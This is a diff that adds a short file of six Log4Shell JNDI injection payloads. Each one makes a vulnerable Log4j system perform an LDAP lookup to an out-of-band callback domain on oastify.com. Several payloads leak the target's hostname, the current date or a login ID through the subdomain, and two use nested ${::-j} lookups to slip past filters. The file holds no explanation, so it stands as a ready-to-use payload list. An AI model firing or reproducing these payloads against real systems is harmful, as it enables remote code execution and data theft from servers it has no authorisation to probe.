@@ -1,0 +1,6 @@
+${jndi:ldap://${hostName}.2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/n_hostname}
+${jndi:ldap://${date:YYYY}.2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/n_date}
+${jndi:ldap://${ctx:loginId}.2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/n_ctx}
+${${::-j}ndi:ldap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/n_negation}
+${${::-j}${::-n}${::-d}${::-i}:ldap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/n_full_neg}
+${jndi:ldap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/n_simple}
